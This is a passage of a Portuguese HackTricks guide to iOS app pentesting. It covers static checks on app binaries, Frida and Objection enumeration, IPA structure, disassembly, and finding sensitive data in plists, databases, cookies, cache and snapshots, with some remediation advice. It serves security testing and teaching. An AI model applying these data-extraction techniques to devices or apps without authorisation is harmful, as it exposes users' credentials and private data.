# iOS Pentesting

![](../.gitbook/assets/image%20\(9\)%20\(1\)%20\(2\).png)

\
Use [**Trickest**](https://trickest.io/) para construir e automatizar facilmente fluxos de trabalho com as ferramentas comunit√°rias mais avan√ßadas do mundo.\
Acesse hoje mesmo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? Ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Conceitos b√°sicos do iOS

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

## Ambiente de teste

Nesta p√°gina, voc√™ pode encontrar informa√ß√µes sobre o **simulador iOS**, **emuladores** e **jailbreaking**:

{% content-ref url="ios-testing-environment.md" %}
[ios-testing-environment.md](ios-testing-environment.md)
{% endcontent-ref %}

## An√°lise inicial

### Opera√ß√µes b√°sicas de teste do iOS

Durante o teste, **v√°rias opera√ß√µes ser√£o sugeridas** (conectar ao dispositivo, ler/escrever/fazer upload/fazer download de arquivos, usar algumas ferramentas...). Portanto, se voc√™ n√£o sabe como realizar alguma dessas a√ß√µes, **comece lendo a p√°gina**:

{% content-ref url="basic-ios-testing-operations.md" %}
[basic-ios-testing-operations.md](basic-ios-testing-operations.md)
{% endcontent-ref %}

{% hint style="info" %}
Para os pr√≥ximos passos, **o aplicativo deve estar instalado** no dispositivo e voc√™ j√° deve ter obtido o **arquivo IPA** do aplicativo.\
Leia a p√°gina [Opera√ß√µes b√°sicas de teste do iOS](basic-ios-testing-operations.md) para aprender como fazer isso.
{% endhint %}

### An√°lise est√°tica b√°sica

Recomenda-se usar a ferramenta [**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF) para realizar uma An√°lise Est√°tica autom√°tica no arquivo IPA.

Identifica√ß√£o das **prote√ß√µes presentes no bin√°rio**:

*   **PIE (Position Independent Executable)**: Quando ativado, o aplicativo √© carregado em um endere√ßo de mem√≥ria aleat√≥rio toda vez que √© iniciado, tornando mais dif√≠cil prever seu endere√ßo de mem√≥ria inicial.

```
otool -hv <app-binary> | grep PIE   # Deve incluir a flag PIE
```
*   **Stack Canaries**: Para validar a integridade da pilha, um valor 'canary' √© colocado na pilha antes de chamar uma fun√ß√£o e √© validado novamente quando a fun√ß√£o termina.

```
otool -I -v <app-binary> | grep stack_chk   # Deve incluir os s√≠mbolos: stack_chk_guard e stack_chk_fail
```
*   **ARC (Automatic Reference Counting)**: Para evitar falhas comuns de corrup√ß√£o de mem√≥ria

```
otool -I -v <app-binary> | grep objc_release   # Deve incluir o s√≠mbolo _objc_release
```
*   **Binary Criptografado**: O bin√°rio deve estar criptografado

```
otool -arch all -Vl <app-binary> | grep -A5 LC_ENCRYPT   # O cryptid deve ser 1
```

**Identifica√ß√£o de Fun√ß√µes Sens√≠veis/Inseguras**

*   **Algoritmos de Hash Fracos**

```
# No dispositivo iOS
otool -Iv <app> | grep -w "_CC_MD5"
otool -Iv <app> | grep -w "_CC_SHA1"

# No linux
grep -iER "_CC_MD5"
grep -iER "_CC_SHA1"
```
*   **Fun√ß√µes de Aleatoriedade Inseguras**

```
# No dispositivo iOS
otool -Iv <app> | grep -w "_random"
otool -Iv <app> | grep -w "_srand"
otool -Iv <app> | grep -w "_rand"

# No linux
grep -iER "_random"
grep -iER "_srand"
grep -iER "_rand"
```
*   **Fun√ß√£o 'Malloc' Insegura**

```
# No dispositivo iOS
otool -Iv <app> | grep -w "_malloc"

# No linux
grep -iER "_malloc"
```
*   **Fun√ß√µes Inseguras e Vulner√°veis**

```
# No dispositivo iOS
otool -Iv <app> | grep -w "_gets"
otool -Iv <app> | grep -w "_memcpy"
otool -Iv <app> | grep -w "_strncpy"
otool -Iv <app> | grep -w "_strlen"
otool -Iv <app> | grep -w "_vsnprintf"
otool -Iv <app> | grep -w "_sscanf"
otool -Iv <app> | grep -w "_strtok"
otool -Iv <app> | grep -w "_alloca"
otool -Iv <app> | grep -w "_sprintf"
otool -Iv <app> | grep -w "_printf"
otool -Iv <app> | grep -w "_vsprintf"

# No linux
grep -R "_gets"
grep -iER "_memcpy"
grep -iER "_strncpy"
grep -iER "_strlen"
grep -iER "_vsnprintf"
grep -iER "_sscanf"
grep -iER "_strtok"
grep -iER "_alloca"
grep -iER "_sprintf"
grep -iER "_printf"
grep -iER "_vsprintf"
```
### An√°lise Din√¢mica B√°sica

Confira a an√°lise din√¢mica realizada pelo [**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF). Voc√™ precisar√° navegar pelas diferentes visualiza√ß√µes e interagir com elas, mas o MobSF ir√° conectar v√°rias classes e realizar outras a√ß√µes, preparando um relat√≥rio quando voc√™ terminar.

### Listando Apps Instalados

Ao direcionar apps que est√£o instalados no dispositivo, voc√™ primeiro precisa descobrir o identificador de pacote correto do aplicativo que deseja analisar. Voc√™ pode usar `frida-ps -Uai` para obter todos os apps (`-a`) atualmente instalados (`-i`) no dispositivo USB conectado (`-U`):
```bash
$ frida-ps -Uai
PID  Name                 Identifier
----  -------------------  -----------------------------------------
6847  Calendar             com.apple.mobilecal
6815  Mail                 com.apple.mobilemail
-  App Store            com.apple.AppStore
-  Apple Store          com.apple.store.Jolly
-  Calculator           com.apple.calculator
-  Camera               com.apple.camera
-  iGoat-Swift          OWASP.iGoat-Swift
```
### Enumera√ß√£o B√°sica e Hooking

Aprenda como **enumerar os componentes do aplicativo** e como **facilmente hookar m√©todos e classes** com o Objection:

{% content-ref url="ios-hooking-with-objection.md" %}
[ios-hooking-with-objection.md](ios-hooking-with-objection.md)
{% endcontent-ref %}

### Estrutura do IPA

Os arquivos `.ipa` s√£o **pacotes compactados**, ent√£o voc√™ pode alterar a extens√£o para `.zip` e **descompact√°-los**. Um aplicativo **completo e empacotado**, pronto para ser instalado, √© comumente chamado de **Bundle**.\
Ap√≥s descompact√°-los, voc√™ deve ver `<NOME>.app`, um arquivo compactado que cont√©m o restante dos recursos.

* `Info.plist`: Um arquivo que cont√©m algumas das configura√ß√µes espec√≠ficas do aplicativo.
* `_CodeSignature/` cont√©m um arquivo plist com uma assinatura sobre todos os arquivos no pacote.
* `Assets.car`: Outro arquivo compactado que cont√©m recursos (√≠cones).
* `Frameworks/` cont√©m as bibliotecas nativas do aplicativo como arquivos .dylib ou .framework.
* `PlugIns/` pode conter extens√µes de aplicativos como arquivos .appex (n√£o presentes no exemplo).
* [`Core Data`](https://developer.apple.com/documentation/coredata): √â usado para salvar os dados permanentes do seu aplicativo para uso offline, para armazenar dados tempor√°rios em cache e adicionar funcionalidade de desfazer ao seu aplicativo em um √∫nico dispositivo. Para sincronizar dados em v√°rios dispositivos em uma √∫nica conta do iCloud, o Core Data espelha automaticamente seu esquema em um cont√™iner CloudKit.
* [`PkgInfo`](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPRuntimeConfig/Articles/ConfigApplications.html): O arquivo `PkgInfo` √© uma maneira alternativa de especificar os c√≥digos de tipo e criador do seu aplicativo ou pacote.
* **en.lproj, fr.proj, Base.lproj**: S√£o os pacotes de idiomas que cont√™m recursos para esses idiomas espec√≠ficos e um recurso padr√£o caso um idioma n√£o seja suportado.

Existem v√°rias maneiras de definir a interface do usu√°rio em um aplicativo iOS: arquivos _storyboard_, _nib_ ou _xib_.

**Info.plist**

A lista de propriedades de informa√ß√µes ou `Info.plist` √© a principal fonte de informa√ß√µes para um aplicativo iOS. Consiste em um arquivo estruturado contendo pares de **chave-valor** que descrevem informa√ß√µes de configura√ß√£o essenciais sobre o aplicativo. Na verdade, todos os execut√°veis empacotados (extens√µes de aplicativos, frameworks e aplicativos) **devem ter** um arquivo `Info.plist`. Voc√™ pode encontrar todas as chaves poss√≠veis na [**Documenta√ß√£o do Desenvolvedor da Apple**](https://developer.apple.com/documentation/bundleresources/information\_property\_list?language=objc).

O arquivo pode estar formatado em **XML ou bin√°rio (bplist)**. Voc√™ pode **convert√™-lo para o formato XML** com um √∫nico comando:

*   No macOS com `plutil`, que √© uma ferramenta nativa do macOS 10.2 e vers√µes superiores (atualmente n√£o h√° documenta√ß√£o oficial online dispon√≠vel):

```bash
$ plutil -convert xml1 Info.plist
```
*   No Linux:

```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```

Aqui est√° uma lista n√£o exaustiva de algumas informa√ß√µes e as palavras-chave correspondentes que voc√™ pode pesquisar facilmente no arquivo `Info.plist` apenas inspecionando o arquivo ou usando `grep -i <palavra-chave> Info.plist`:

* Strings de prop√≥sito das permiss√µes do aplicativo: `UsageDescription`
* Esquemas de URL personalizados: `CFBundleURLTypes`
* Tipos de documento personalizados exportados/importados: `UTExportedTypeDeclarations` / `UTImportedTypeDeclarations`
* Configura√ß√£o de Seguran√ßa de Transporte do Aplicativo (ATS): `NSAppTransportSecurity`

Consulte os cap√≠tulos mencionados para aprender mais sobre como testar cada um desses pontos.

**Caminhos de Dados**

No iOS, os aplicativos do sistema podem ser encontrados no diret√≥rio `/Applications`, enquanto os aplicativos instalados pelo usu√°rio est√£o dispon√≠veis em `/private/var/containers/`. No entanto, encontrar a pasta certa apenas navegando no sistema de arquivos n√£o √© uma tarefa trivial, pois cada aplicativo recebe um UUID (Identificador √önico Universal) de 128 bits aleat√≥rio atribu√≠do para os nomes de diret√≥rio.

Para obter facilmente as informa√ß√µes do diret√≥rio de instala√ß√£o para aplicativos instalados pelo usu√°rio, voc√™ pode usar o comando **`env`** do Objection, que tamb√©m mostrar√° todas as informa√ß√µes de diret√≥rio do aplicativo:
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # env

Name               Path
-----------------  -------------------------------------------------------------------------------------------
BundlePath         /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app
CachesDirectory    /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library/Caches
DocumentDirectory  /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Documents
LibraryDirectory   /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library
```
Como voc√™ pode ver, os aplicativos t√™m dois locais principais:

* O **diret√≥rio Bundle** (`/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/`).
* O **diret√≥rio de Dados** (`/var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/`).

Essas pastas cont√™m informa√ß√µes que devem ser examinadas de perto durante as avalia√ß√µes de seguran√ßa do aplicativo (por exemplo, ao analisar os dados armazenados em busca de dados sens√≠veis).

**Diret√≥rio Bundle:**

* **AppName.app**
* Este √© o Pacote do Aplicativo, como visto anteriormente no IPA, ele cont√©m dados essenciais do aplicativo, conte√∫do est√°tico e o bin√°rio compilado do aplicativo.
* Este diret√≥rio √© vis√≠vel para os usu√°rios, mas **os usu√°rios n√£o podem gravar nele**.
* O conte√∫do deste diret√≥rio **n√£o √© copiado**.
* O conte√∫do desta pasta √© usado para **validar a assinatura do c√≥digo**.

**Diret√≥rio de Dados:**

* **Documents/**
* Cont√©m todos os dados gerados pelo usu√°rio. O usu√°rio final do aplicativo inicia a cria√ß√£o desses dados.
* Vis√≠vel para os usu√°rios e **os usu√°rios podem gravar nele**.
* O conte√∫do deste diret√≥rio √© **copiado**.
* O aplicativo pode desabilitar caminhos definindo `NSURLIsExcludedFromBackupKey`.
* **Library/**
* Cont√©m todos os **arquivos que n√£o s√£o espec√≠ficos do usu√°rio**, como **caches**, **prefer√™ncias**, **cookies** e arquivos de configura√ß√£o de lista de propriedades (plist).
* Os aplicativos iOS geralmente usam os subdiret√≥rios `Application Support` e `Caches`, mas o aplicativo pode criar subdiret√≥rios personalizados.
* **Library/Caches/**
* Cont√©m **arquivos em cache semi-persistentes**.
* Invis√≠vel para os usu√°rios e **os usu√°rios n√£o podem gravar nele**.
* O conte√∫do deste diret√≥rio **n√£o √© copiado**.
* O sistema operacional pode excluir automaticamente os arquivos deste diret√≥rio quando o aplicativo n√£o est√° em execu√ß√£o e o espa√ßo de armazenamento est√° baixo.
* **Library/Application Support/**
* Cont√©m **arquivos persistentes** necess√°rios para a execu√ß√£o do aplicativo.
* **Invis√≠vel** para os usu√°rios e os usu√°rios n√£o podem gravar nele.
* O conte√∫do deste diret√≥rio √© **copiado**.
* O aplicativo pode desabilitar caminhos definindo `NSURLIsExcludedFromBackupKey`.
* **Library/Preferences/**
* Usado para armazenar propriedades que podem **persistir mesmo depois que um aplicativo √© reiniciado**.
* As informa√ß√µes s√£o salvas, sem criptografia, dentro do sandbox do aplicativo em um arquivo plist chamado \[BUNDLE\_ID].plist.
* Todos os pares chave/valor armazenados usando `NSUserDefaults` podem ser encontrados neste arquivo.
* **tmp/**
* Use este diret√≥rio para gravar **arquivos tempor√°rios** que n√£o precisam persistir entre os lan√ßamentos do aplicativo.
* Cont√©m arquivos em cache n√£o persistentes.
* **Invis√≠vel** para os usu√°rios.
* O conte√∫do deste diret√≥rio n√£o √© copiado.
* O sistema operacional pode excluir automaticamente os arquivos deste diret√≥rio quando o aplicativo n√£o est√° em execu√ß√£o e o espa√ßo de armazenamento est√° baixo.

Vamos dar uma olhada mais de perto no diret√≥rio do Pacote do Aplicativo (.app) do iGoat-Swift dentro do diret√≥rio Bundle (`/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app`):
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # ls
NSFileType      Perms  NSFileProtection    ...  Name
------------  -------  ------------------  ...  --------------------------------------
Regular           420  None                ...  rutger.html
Regular           420  None                ...  mansi.html
Regular           420  None                ...  splash.html
Regular           420  None                ...  about.html

Regular           420  None                ...  LICENSE.txt
Regular           420  None                ...  Sentinel.txt
Regular           420  None                ...  README.txt
```
### Revers√£o Bin√°ria

Dentro da pasta `<nome-do-aplicativo>.app`, voc√™ encontrar√° um arquivo bin√°rio chamado `<nome-do-aplicativo>`. Este √© o arquivo que ser√° **executado**. Voc√™ pode realizar uma inspe√ß√£o b√°sica do bin√°rio com a ferramenta **`otool`**:
```bash
otool -Vh DVIA-v2 #Check some compilation attributes
magic  cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
MH_MAGIC_64    ARM64        ALL  0x00     EXECUTE    65       7112   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE

otool -L DVIA-v2 #Get third party libraries
DVIA-v2:
/usr/lib/libc++.1.dylib (compatibility version 1.0.0, current version 400.9.1)
/usr/lib/libsqlite3.dylib (compatibility version 9.0.0, current version 274.6.0)
/usr/lib/libz.1.dylib (compatibility version 1.0.0, current version 1.2.11)
@rpath/Bolts.framework/Bolts (compatibility version 1.0.0, current version 1.0.0)
[...]
```
**Verifique se o aplicativo est√° criptografado**

Verifique se h√° alguma sa√≠da para:
```bash
otool -l <app-binary> | grep -A 4 LC_ENCRYPTION_INFO
```
**Desmontando o bin√°rio**

Desmonte a se√ß√£o de texto:
```bash
otool -tV DVIA-v2
DVIA-v2:
(__TEXT,__text) section
+[DDLog initialize]:
0000000100004ab8    sub    sp, sp, #0x60
0000000100004abc    stp    x29, x30, [sp, #0x50]   ; Latency: 6
0000000100004ac0    add    x29, sp, #0x50
0000000100004ac4    sub    x8, x29, #0x10
0000000100004ac8    mov    x9, #0x0
0000000100004acc    adrp    x10, 1098 ; 0x10044e000
0000000100004ad0    add    x10, x10, #0x268
```
Para imprimir o **segmento Objective-C** do aplicativo de exemplo, pode-se usar:
```bash
otool -oV DVIA-v2
DVIA-v2:
Contents of (__DATA,__objc_classlist) section
00000001003dd5b8 0x1004423d0 _OBJC_CLASS_$_DDLog
isa        0x1004423a8 _OBJC_METACLASS_$_DDLog
superclass 0x0 _OBJC_CLASS_$_NSObject
cache      0x0 __objc_empty_cache
vtable     0x0
data       0x1003de748
flags          0x80
instanceStart  8
```
Para obter um c√≥digo Objective-C mais compacto, voc√™ pode usar [**class-dump**](http://stevenygard.com/projects/class-dump/):
```bash
class-dump some-app
//
//     Generated by class-dump 3.5 (64 bit).
//
//     class-dump is Copyright (C) 1997-1998, 2000-2001, 2004-2013 by Steve Nygard.
//

#pragma mark Named Structures

struct CGPoint {
double _field1;
double _field2;
};

struct CGRect {
struct CGPoint _field1;
struct CGSize _field2;
};

struct CGSize {
double _field1;
double _field2;
};
```
No entanto, as melhores op√ß√µes para desmontar o bin√°rio s√£o: [**Hopper**](https://www.hopperapp.com/download.html?) e [**IDA**](https://www.hex-rays.com/products/ida/support/download\_freeware/).

![](../.gitbook/assets/image%20\(9\)%20\(1\)%20\(2\).png)

\
Use [**Trickest**](https://trickest.io/) para construir facilmente e **automatizar fluxos de trabalho** com as ferramentas comunit√°rias mais avan√ßadas do mundo.\
Acesse hoje mesmo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Armazenamento de Dados

Para aprender sobre como o iOS armazena dados no dispositivo, leia esta p√°gina:

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

{% hint style="warning" %}
Os seguintes locais para armazenar informa√ß√µes devem ser verificados **logo ap√≥s a instala√ß√£o do aplicativo**, **ap√≥s verificar todas as funcionalidades** do aplicativo e at√© mesmo ap√≥s **sair de um usu√°rio e entrar em outro**.\
O objetivo √© encontrar **informa√ß√µes sens√≠veis desprotegidas** do aplicativo (senhas, tokens), do usu√°rio atual e de usu√°rios que fizeram login anteriormente.
{% endhint %}

### Plist

Os arquivos **plist** s√£o arquivos XML estruturados que **cont√™m pares de chave-valor**. √â uma forma de armazenar dados persistentes, ent√£o √†s vezes voc√™ pode encontrar **informa√ß√µes sens√≠veis nesses arquivos**. √â recomendado verificar esses arquivos ap√≥s a instala√ß√£o do aplicativo e ap√≥s us√°-lo intensivamente para ver se novos dados s√£o gravados.

A forma mais comum de persistir dados em arquivos plist √© atrav√©s do uso do **NSUserDefaults**. Este arquivo plist √© salvo dentro do sandbox do aplicativo em **`Library/Preferences/<appBundleID>.plist`**

A classe [`NSUserDefaults`](https://developer.apple.com/documentation/foundation/nsuserdefaults) fornece uma interface program√°tica para interagir com o sistema padr√£o. O sistema padr√£o permite que um aplicativo personalize seu comportamento de acordo com as **prefer√™ncias do usu√°rio**. Os dados salvos pelo `NSUserDefaults` podem ser visualizados no pacote do aplicativo. Esta classe armazena **dados** em um **arquivo plist**, mas √© destinada a ser usada com pequenas quantidades de dados.

Esses dados n√£o podem ser acessados diretamente por um computador confi√°vel, mas podem ser acessados fazendo um **backup**.

Voc√™ pode **extrair** as informa√ß√µes salvas usando **`NSUserDefaults`** usando o comando `ios nsuserdefaults get` do objection.

Para encontrar todos os arquivos plist usados pelo aplicativo, voc√™ pode acessar `/private/var/mobile/Containers/Data/Application/{APPID}` e executar:
```bash
find ./ -name "*.plist"
```
O arquivo pode estar formatado em **XML ou bin√°rio (bplist)**. Voc√™ pode **convert√™-lo para o formato XML** com um √∫nico comando:

*   No macOS com `plutil`, que √© uma ferramenta nativa do macOS 10.2 e vers√µes superiores (atualmente n√£o h√° documenta√ß√£o oficial online dispon√≠vel):

```bash
$ plutil -convert xml1 Info.plist
```
*   No Linux:

```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
*   Em uma sess√£o do Objection:

```bash
ios plist cat /private/var/mobile/Containers/Data/Application/AF1F534B-1B8F-0825-ACB21-C0301AB7E56D/Library/Preferences/com.some.package.app.plist
```

### Core Data

[`Core Data`](https://developer.apple.com/library/content/documentation/Cocoa/Conceptual/CoreData/nsfetchedresultscontroller.html#//apple\_ref/doc/uid/TP40001075-CH8-SW1) √© um framework para gerenciar a camada de modelo de objetos em seu aplicativo. [O Core Data pode usar o SQLite como seu armazenamento persistente](https://cocoacasts.com/what-is-the-difference-between-core-data-and-sqlite/), mas o pr√≥prio framework n√£o √© um banco de dados.\
O CoreData n√£o criptografa seus dados por padr√£o. No entanto, uma camada adicional de criptografia pode ser adicionada ao CoreData. Consulte o [Reposit√≥rio do GitHub](https://github.com/project-imas/encrypted-core-data) para mais detalhes.

Voc√™ pode encontrar as informa√ß√µes do SQLite Core Data de um aplicativo no caminho `/private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support`

**Se voc√™ conseguir abrir o SQLite e acessar informa√ß√µes sens√≠veis, ent√£o encontrou uma m√° configura√ß√£o.**

{% code title="C√≥digo do iGoat" %}
```objectivec
-(void)storeDetails {
AppDelegate * appDelegate = (AppDelegate *)(UIApplication.sharedApplication.delegate);

NSManagedObjectContext *context =[appDelegate managedObjectContext];

User *user = [self fetchUser];
if (user) {
return;
}
user = [NSEntityDescription insertNewObjectForEntityForName:@"User"
inManagedObjectContext:context];
user.email = CoreDataEmail;
user.password = CoreDataPassword;
NSError *error;
if (![context save:&error]) {
NSLog(@"Error in saving data: %@", [error localizedDescription]);

}else{
NSLog(@"data stored in core data");
}
}
```
{% endcode %}

### YapDatabase

[YapDatabase](https://github.com/yapstudios/YapDatabase) √© um armazenamento de chave/valor constru√≠do em cima do SQLite.\
Como os bancos de dados Yap s√£o bancos de dados SQLite, voc√™ pode encontr√°-los usando o comando proposto na se√ß√£o anterior.

### Outros bancos de dados SQLite

√â comum que os aplicativos criem seus pr√≥prios bancos de dados SQLite. Eles podem estar armazenando dados sens√≠veis neles e deixando-os sem criptografia. Portanto, √© sempre interessante verificar todos os bancos de dados dentro do diret√≥rio do aplicativo. Portanto, v√° para o diret√≥rio do aplicativo onde os dados s√£o salvos (`/private/var/mobile/Containers/Data/Application/{APPID}`)
```bash
find ./ -name "*.sqlite" -or -name "*.db"
```
### Bancos de Dados em Tempo Real do Firebase

Eles podem ser aproveitados pelos desenvolvedores de aplicativos para **armazenar e sincronizar dados com um banco de dados hospedado em nuvem NoSQL**. Os dados s√£o armazenados como JSON e s√£o sincronizados em tempo real para cada cliente conectado, e tamb√©m permanecem dispon√≠veis mesmo quando o aplicativo est√° offline.

Voc√™ pode encontrar como verificar bancos de dados do Firebase mal configurados aqui:

{% content-ref url="../../network-services-pentesting/pentesting-web/buckets/firebase-database.md" %}
[firebase-database.md](../../network-services-pentesting/pentesting-web/buckets/firebase-database.md)
{% endcontent-ref %}

### Bancos de Dados Realm

[Realm Objective-C](https://realm.io/docs/objc/latest/) e [Realm Swift](https://realm.io/docs/swift/latest/) n√£o s√£o fornecidos pela Apple, mas ainda valem a pena serem mencionados. Eles **armazenam tudo sem criptografia, a menos que a configura√ß√£o tenha a criptografia habilitada**.

Voc√™ pode encontrar esses bancos de dados em `/private/var/mobile/Containers/Data/Application/{APPID}`
```bash
iPhone:/private/var/mobile/Containers/Data/Application/A079DF84-726C-4AEA-A194-805B97B3684A/Documents root# ls
default.realm  default.realm.lock  default.realm.management/  default.realm.note|

$ find ./ -name "*.realm*"
```
Voc√™ pode usar a ferramenta [**Realm Studio**](https://github.com/realm/realm-studio) para abrir esses arquivos de banco de dados.

O exemplo a seguir demonstra como usar a criptografia com um banco de dados Realm:
```swift
// Open the encrypted Realm file where getKey() is a method to obtain a key from the Keychain or a server
let config = Realm.Configuration(encryptionKey: getKey())
do {
let realm = try Realm(configuration: config)
// Use the Realm as normal
} catch let error as NSError {
// If the encryption key is wrong, `error` will say that it's an invalid database
fatalError("Error opening realm: \(error)")
}
```
### Bancos de Dados Couchbase Lite

[Couchbase Lite](https://github.com/couchbase/couchbase-lite-ios) √© um mecanismo de banco de dados leve, embutido e orientado a documentos (NoSQL) que pode ser sincronizado. Ele √© compilado nativamente para iOS e macOS.

Verifique poss√≠veis bancos de dados couchbase em `/private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support/`

### Cookies

O iOS armazena os cookies dos aplicativos no **`Library/Cookies/cookies.binarycookies`** dentro da pasta de cada aplicativo. No entanto, os desenvolvedores √†s vezes decidem salv√°-los no **keychain** pois o mencionado **arquivo de cookies pode ser acessado em backups**.

Para inspecionar o arquivo de cookies, voc√™ pode usar [**este script em python**](https://github.com/mdegrazia/Safari-Binary-Cookie-Parser) ou usar o comando **`ios cookies get`** do Objection.\
**Voc√™ tamb√©m pode usar o Objection para** converter esses arquivos para um formato JSON e inspecionar os dados.
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios cookies get --json
[
{
"domain": "highaltitudehacks.com",
"expiresDate": "2051-09-15 07:46:43 +0000",
"isHTTPOnly": "false",
"isSecure": "false",
"name": "username",
"path": "/",
"value": "admin123",
"version": "0"
}
]
```
### Cache

Por padr√£o, o NSURLSession armazena dados, como **solicita√ß√µes e respostas HTTP no banco de dados Cache.db**. Este banco de dados pode conter **dados sens√≠veis**, se tokens, nomes de usu√°rio ou qualquer outra informa√ß√£o sens√≠vel tiver sido armazenada em cache. Para encontrar as informa√ß√µes em cache, abra o diret√≥rio de dados do aplicativo (`/var/mobile/Containers/Data/Application/<UUID>`) e v√° para `/Library/Caches/<Bundle Identifier>`. O **cache do WebKit tamb√©m √© armazenado no arquivo Cache.db**. O **Objection** pode abrir e interagir com o banco de dados com o comando `sqlite connect Cache.db`, pois √© um **banco de dados SQLite normal**.

√â **recomendado desativar o armazenamento em cache desses dados**, pois eles podem conter informa√ß√µes sens√≠veis na solicita√ß√£o ou resposta. A lista a seguir mostra diferentes maneiras de fazer isso:

1. √â recomendado remover as respostas em cache ap√≥s o logout. Isso pode ser feito com o m√©todo fornecido pela Apple chamado [`removeAllCachedResponses`](https://developer.apple.com/documentation/foundation/urlcache/1417802-removeallcachedresponses). Voc√™ pode chamar esse m√©todo da seguinte forma:

`URLCache.shared.removeAllCachedResponses()`

Esse m√©todo remover√° todas as solicita√ß√µes e respostas em cache do arquivo Cache.db.
2. Se voc√™ n√£o precisa usar os cookies, seria recomendado usar apenas a propriedade [.ephemeral](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral) da configura√ß√£o URLSession, que desativar√° o salvamento de cookies e caches.

[Documenta√ß√£o da Apple](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral):

`Um objeto de configura√ß√£o de sess√£o ef√™mera √© semelhante a uma configura√ß√£o de sess√£o padr√£o (consulte default), exceto que o objeto de sess√£o correspondente n√£o armazena caches, armazenamentos de credenciais ou quaisquer dados relacionados √† sess√£o no disco. Em vez disso, os dados relacionados √† sess√£o s√£o armazenados na RAM. A √∫nica vez que uma sess√£o ef√™mera grava dados no disco √© quando voc√™ solicita que ela grave o conte√∫do de uma URL em um arquivo.`
3. O cache tamb√©m pode ser desativado definindo a Pol√≠tica de Cache como [.notAllowed](https://developer.apple.com/documentation/foundation/urlcache/storagepolicy/notallowed). Isso desativar√° o armazenamento de cache de qualquer forma, seja na mem√≥ria ou no disco.

### Snapshots

Sempre que voc√™ pressiona o bot√£o home, o iOS **tira uma captura de tela da tela atual** para poder fazer a transi√ß√£o para o aplicativo de maneira mais suave. No entanto, se houver **dados sens√≠veis** na tela atual, eles ser√£o **salvos** na **imagem** (que **persiste** mesmo ap√≥s reinicializa√ß√µes). Essas s√£o as capturas de tela √†s quais voc√™ tamb√©m pode acessar tocando duas vezes na tela inicial para alternar entre os aplicativos.

A menos que o iPhone esteja com jailbreak, o **atacante** precisa ter **acesso** ao **dispositivo desbloqueado** para ver essas capturas de tela. Por padr√£o, a √∫ltima captura de tela √© armazenada no sandbox do aplicativo na pasta `Library/Caches/Snapshots/` ou `Library/SplashBoard/Snapshots` (os computadores confi√°veis n√£o podem acessar o sistema de arquivos a partir do iOS 7.0).

Uma maneira de evitar esse comportamento indesejado √© colocar uma tela em branco ou remover os dados sens√≠veis antes de tirar a captura de tela usando a fun√ß√£o `ApplicationDidEnterBackground()`.

A seguir, um exemplo de m√©todo de remedia√ß√£o que definir√° uma captura de tela padr√£o.

Swift:
```swift
private var backgroundImage: UIImageView?

func applicationDidEnterBackground(_ application: UIApplication) {
let myBanner = UIImageView(image: #imageLiteral(resourceName: "overlayImage"))
myBanner.frame = UIScreen.main.bounds
backgroundImage = myBanner
window?.addSubview(myBanner)
}

func applicationWillEnterForeground(_ application: UIApplication) {
